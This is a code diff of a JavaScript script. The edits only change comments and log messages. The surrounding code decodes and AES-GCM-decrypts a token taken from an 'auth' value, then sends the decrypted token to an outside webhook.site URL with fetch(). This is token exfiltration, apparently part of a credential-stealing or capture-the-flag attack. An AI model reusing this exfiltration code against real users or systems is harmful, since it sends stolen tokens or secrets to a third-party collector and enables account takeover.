@@ -57,14 +57,14 @@
             return decoder.decode(buffer);
         }
 
-        // Decrypt token function (JavaScript version of your Python function)
+        // Decrypt token function
         async function decryptToken(aesKey, ivStr, encrypted) {
             try {
-                // Reverse the replacement
+                // Reverse the replacement (*c4l* to /)
                 const combined = encrypted.replace(/\*c4l\*/g, "/");
                 log("After replacing *c4l* with /: " + combined);
                 
-                // Split by space
+                // Split by space to get ciphertext and tag
                 const parts = combined.split(" ");
                 if (parts.length !== 2) {
                     throw new Error("Invalid encrypted format: expected ciphertext and tag separated by space");
@@ -101,7 +101,7 @@
                     {
                         name: 'AES-GCM',
                         iv: ivBytes,
-                        tagLength: 128 // 16 bytes * 8 bits
+                        tagLength: 128
                     },
                     cryptoKey,
                     ctTag
@@ -126,7 +126,7 @@
                 let modifiedAuth = auth.substring(1);
                 log("After removing first char: " + modifiedAuth);
                 
-                // Replace %20 with space
+                // Replace %20 with space (this is the key step for proper decryption)
                 modifiedAuth = modifiedAuth.replace(/%20/g, " ");
                 log("After replacing %20 with space: " + modifiedAuth);
                 
@@ -140,7 +140,8 @@
                     
                     // Construct webhook URL with decrypted token
                     const webhookUrl = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${encodeURIComponent(decryptedToken)}`;
-                    log("Sending request to: " + webhookUrl);
+                    log("Sending request to webhook...");
+                    log("URL: " + webhookUrl);
                     
                     // Send request
                     const response = await fetch(webhookUrl);
